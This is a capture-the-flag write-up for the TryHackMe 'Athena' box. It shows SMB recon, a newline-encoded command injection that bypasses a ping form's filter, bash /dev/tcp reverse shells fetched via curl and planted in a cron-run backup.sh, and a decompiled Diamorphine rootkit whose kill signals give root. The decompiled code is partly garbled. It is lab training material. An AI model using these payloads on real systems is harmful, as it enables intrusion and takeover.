# THM-CTF-Athena
Writeup for the "Athena" capture the flag boot2root machine on tryhackme made by MatheuZSec
                                                                               
```ruby
                                          
                                        
 $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\  
$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ 
$$ /  $$ |$$ /  $$ |$$ /  $$ |$$ /  $$ |
$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |
$$$$$$$  |\$$$$$$  |\$$$$$$$ |\$$$$$$$ |
$$  ____/  \______/  \____$$ | \____$$ |
$$ |                $$\   $$ |$$\   $$ |
$$ |                \$$$$$$  |\$$$$$$  |
\__|                 \______/  \______/ 
```
## Recon:
```bash
nmap -sC -sV -p- [VictimIp]
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3b:c8:f8:13:e0:cb:42:60:0d:f6:4c:dc:55:d8:3b:ed (RSA)
|   256 1f:42:e1:c3:a5:17:2a:38:69:3e:9b:73:6d:cd:56:33 (ECDSA)
|_  256 7a:67:59:8d:37:c5:67:29:e8:53:e8:1e:df:b0:c7:1e (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Athena - Gods of olympus
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Enumeration of port 80, source code inspection, and directory busting yielded no results.

SMB service enumeration revealed two shares, one of which public is accessible.
```bash
┌──(p0gg)-[~]
└─$ smbclient -L \\\\10.10.166.4
Password for [WORKGROUP\p0gg]:
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	public          Disk      
	IPC$            IPC       IPC Service (Samba 4.15.13-Ubuntu)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
                                                                                                        
┌──(p0gg)-[~]
└─$ smbclient \\\\10.10.166.4\\public
Password for [WORKGROUP\p0gg]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Apr 16 20:54:43 2023
  ..                                  D        0  Sun Apr 16 20:54:05 2023
  msg_for_administrator.txt           N      253  Sun Apr 16 14:59:44 2023

```

We discovered a new pathway that eluded detection through traditional directory enumeration methods like DirBuster.
```bash
└─$ cat msg_for_administrator.txt 

Dear Administrator,

I would like to inform you that a new Ping system is being developed and 
I left the corresponding application in a specific path, which can be accessed
through the following address: /myrouterpanel

Yours sincerely,

Athena
Intern
```

## Foothold:

Upon accessing this pathway, we encountered a command line application capable of pinging an IP address. Attempts to utilize command chaining operators such as &, |, or ; were met with a response stating "Attempt hacking!" Consequently, a straightforward command chain injection, like the one used for a reverse shell, was ineffective.

To investigate further, we utilized Burp Suite's repeater to test various payloads.

Upon reviewing URL encoding options from this source, we initially attempted encoding for &, |, or ;, all of which were readily identified. However, employing URL encoding for a linefeed (%0a) proved to be successful.

### Input:
```bash
ip=127.0.0.1%0als&submit=
```

### Output:
```html
<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.020 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.033 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.032 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.034 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3065ms
rtt min/avg/max/mdev = 0.020/0.029/0.034/0.005 ms
index.html
ping.php
style.css
under-construction.html
</pre>
```

We can now examine the PHP functionality, although it's not necessary given that we've already established a foothold and can easily obtain a reverse shell. Nonetheless, for the sake of exploration, here's a glimpse of the code.
```php
<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.020 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.035 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.036 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.037 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3064ms
rtt min/avg/max/mdev = 0.020/0.032/0.037/0.007 ms
<?php
if (isset($_POST['submit'])) {
    $host = $_POST['ip'];

    // Validate input
    if (containsMaliciousCharacters($host)) {
        echo "Attempt hacking!";
        exit;
    }

    // Execute command safely
    $cmd = "ping -c 4 " . $host;
    $output = shell_exec($cmd);

    if (!$output) {
        echo "Failed to execute ping.";
        exit;
    }

    echo "<pre>" . $output . "</pre>";
}

function containsMaliciousCharacters($input) {
    // Define the set of characters to check for
    $maliciousChars = array(';', '&', '|');

    // Check if any of the malicious characters exist in the input
    foreach ($maliciousChars as $char) {
        if (stripos($input, $char) !== false) {
            return true;
        }
    }

    return false;
}
?>
</pre>
```

As we already established, upon form submission, the script retrieves the provided IP address, validates it for malicious characters, and executes a ping command to the specified IP address. The script prevents execution if it detects potentially harmful characters like ;, &, or | in the input.

After that the script constructs a ping command ($cmd) to ping the provided IP address using shell_exec(). It validates the output of the command and prints it within HTML ```<pre>``` tags. 

This code attempts to mitigate command injection by preventing the use of specific characters. However, this approach as we saw is not foolproof.

Next, utilizing https://www.revshells.com/, I intend to employ a basic bash -i shell command.
```bash
/bin/bash -i >& /dev/tcp/[attackerIp]/[port]
```

I'll put this into a .sh file named athena.sh, which will be uploaded to the target machine. Using the Vim editor, I'll create and edit the athena.sh file. 

For the file transfer, I'll initiate a Python server with the command:
```bash
python3 -m http.server
```

Next, I'll craft a command to retrieve the athena.sh file on the victim's machine using curl and store it in``` /dev/shm/athena.sh. ```The command will be structured as follows: 
For the file transfer, I'll initiate a Python server with the command:
```bash
ip=127.0.0.1%0Acurl http:/[attackerIp]:8000/athena.sh --output /dev/shm/athena.sh&submit=
```
On the attacker's shell, I'll set up a listener using: 
```bash
nc -lvnp [port]
```

To execute the shell on the victim's machine, I'll use the command:
```bash
ip=127.0.0.1%0Abash /dev/shm/athena.sh&submit=
```

Executing this command will establish a reverse shell connection to our machine.
```bash
└─$ nc -lvnp [port]                                                    
Ncat: Version 7.94 ( https://nmap.org/ncat )
Ncat: Listening on [::]:[port]  
Ncat: Listening on 0.0.0.0:[port]  
Ncat: Connection from [victimIp]:34930.

www-data@routerpanel:/var/www/html/myrouterpanel$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrade the shell using the following command:
```python
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Pivoting

Its easily discoverable that the ```"backup.sh"``` file could be written to by the current user. This particular program automatically executes every minute on the target machine. By echoing an additional shell payload into this file and monitoring in a separate terminal on the attacker's machine, a connection was established within the target machine as soon as a new minute commenced.

The actions taken were as follows:

File Modification: The attacker, under the context of www-data@routerpanel, modified the "backup.sh" file by appending a shell payload:

bashCopy codeecho "/bin/bash -i >& /dev/tcp/[attackerIp]/[port] 0>&1" > backup.sh

Connection Establishment: After modifying the file, a new listener was initiated, awaiting a connection. Upon the next minute, a connection was established, granting access to the "athena" user on the target machine.

Shell Upgrade: The attacker upgraded the shell for improved functionality using the following command:

bashCopy codepython3 -c 'import pty;pty.spawn("/bin/bash")'

Flag Retrieval: With the upgraded shell, the attacker located the flag in the home directory of the user.

## Privilege Escalation and Rootkit Analysis

After gaining access to the "athena" user, we executed sudo -L to review the user's sudo privileges.
```bash
User athena may run the following commands on the routepanel:
  (root) NOPASSWD: /usr/sbin/insmod /mnt/ ... /secret/venom.ko
```

Next, we extracted the "venom.ko" program to conduct a decompilation and static analysis using Ghidra. This program, identified as a rootkit named "Diamorphine_init," is designed to alter program behavior by manipulating critical kernel data structures. Specifically, the rootkit hides itself from detection by system utilities such as "lsmod," which provides a list of all loaded modules.

Diamorphine achieves this by modifying the linked list of modules within the kernel space upon self-loading, ensuring its presence remains concealed from routine system checks.
```c
Decompile: diamorphine_init - (venom.ko)

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* WARNING: Unknown calling convention */
int diamorphine_init(void)
{
    long lVar1;
    ulong * puVar2;
    int iVar3;
    ulong_eax;
    long in_GS_OFFSET;
    ulong_force_order;
                     
    _fentry_();
    lVar1 = * (long * )(in_GS_OFFSET + 0x28);
    _sys_call_table = get_syscall_table_bf();
    if (_sys_call_table = (ulong * ) 0x0) {
        cr0 = ( * _commit_creds)();
        module_hidden = 1;
    }
    (_this_module.list.next) - > prev = _this_module.list.prev;
    (_this_module.list.prev) - > next
        =
        _this_module.list.next; =
    (list_head * ) 0xdead000000000100;
    module_previous = _this_module.list.prev;
    _this_module.list.next
    __this_module.list.prev = (list_head * ) 0xdead000000000122;
    kfree(_this_module.sect_attrs);
    puVar2 = _sys_call_table;
    _this_module.sect_attrs = (module_sect_attrs * ) 0x0;
    orig_getdents
        =
        (t_syscall) _sys_call_table[0x4e];
    orig_getdents64 = (t_syscall) _sys_call_table[0xd9];
    orig_kill = (t_syscall) _sys_call_table[0x3e];
    _sys_call_table[0x4e] = (ulong) hacked_getdents;
    puVar2[0xd9] = (ulong) hacked_getdents64;
    puVar2[0x3e] = (ulong) hacked_kill;
    if (lVar1 != * (long * )(in_GS_OFFSET + 0x28)) {
        /* WARNING: Subroutine does not return */
        _stack_chk_fail();
        iVar3 = _x86_return_thunk();
    }
    return iVar3;
 )
```

The function hacked_kill is designed to process incoming signals.

It evaluates the parameter iVar3, representing the signal number passed to the kill system call.

The function takes different actions based on the value of iVar3:

If iVar3 equals 0x39, it invokes the give_root function, implying that a designated signal number (0x39) initiates a privilege escalation process.

If iVar3 is 0x3f, it toggles the visibility status of the module. This action seems to control the concealment or exposure of the rootkit module.
```c
Decompile: hacked_kill - (venom.ko)

int hacked_kill(pt_regs *pt_regs)
undefined "puVar1;
list_head *plVar2; int sig:
int iVar3;
void _mptr;
undefined *puVar4;
task struct *p;
task_struct *task;
_fentry_();
plVar2 = module_previous; iVar3 (int)pt_regs->si; if (iVar30x39) { give_root();
}
iVar3_x86_return_thunk(); return iVar3;
if (ivar3 == 0x3f) {
}
if (module_hidden != 0) {
}
_this_module.list.next=module_previous->next;
(_this_module.list.next)->prev = &_this_module.list;
_this_module.list.prev = plvar2;
module_hidden = 0;
plVar2->next = (list_head *)0x101008;
iVar3_x86_return_thunk();
return ivar3;
module_previous = _this_module.list.prev:
(_this_module.list.next)->prev=_this_module.list.prev; (_this_module.list.prev)->next = _this_module.list.next; _this_module.list.next (list_head *)0xdead000000000100;
_this_module.list.prev
module_hidden 1;
=
(list_head *)0xdead000000000122;
iVar3_x86_return_thunk(); return iVar3;
if (iVar3 != 0x1f) {
}
_x86_indirect_thunk_rax();
iVar3_x86_return_thunk();
return iVar3;
puVar4 = &init_task;
do {
puVarl = *(undefined **) (puVar4 + 0x848);
puvar4 = puvar1 + -@x848;
if (puVari== &DAT_00102880) goto LAB_001005a5;
} while (*(int *)&pt_regs->di != *(int *) (puVari+ 0x108));
if (puVar4 != (undefined *)0x0) {
}
*(uint *) (puVar1+0x81c)*(uint *) (puVar1+0x81c) 0x10000000;
iVar3_x86_return_thunk();
return ivar3;
LAB_001005a5:
iVar3 = _x86_return_thunk();
return iVar3;
```


The give_root function seems to undertake actions that may lead to privilege escalation. It initiates the creation of a new credentials structure, makes alterations to particular fields within it, and finalizes the new credentials. Consequently, to access the  give_rootfunction and potentially escalate privileges, providing the "hacked_kill" function with the value 0x39 is necessary.
```c
Decompile: give_root (venom.ko)
/* WARNING: Unknown calling convention */
void give root (void)
{
long lVar1;
cred *newcreds;
_fentry_();
1Var1 = prepare_creds(); if (1Var1 = 0) {
*(undefined8 *) (1Var1 + 4) = 0;
*(undefined8 *) (1Var1 + 0xc)
*(undefined8 *) (1Var1 +0x14)
= 0;
= 0:
*(undefined8 *) (1Var1 +0x1c) = 0; commit_creds (1Var1);
_x86_return_thunk();
}
return;
}
```

To achieve root privileges, the following steps were executed.

Load the rootkit module "venom.ko" using the following command:
```bash
athena@routerpanel:/mnt/.../secret$ sudo /usr/sbin/insmod /mnt/.../secret/venom.ko
```

Toggle the visibility of the module by sending signal 63 (to any PID), causing it to become visible or invisible:
```bash
kill -63 0
```

Execute the get_root() function by sending signal 57 to PID 0:
```bash
kill -57 -0
```

This action results in acquiring root privileges on the system.

```bash
athena@routerpanel:/mnt/.../secret$ id
uid=0(root) gid=0(root) groups=0(root),1001(athena)
```
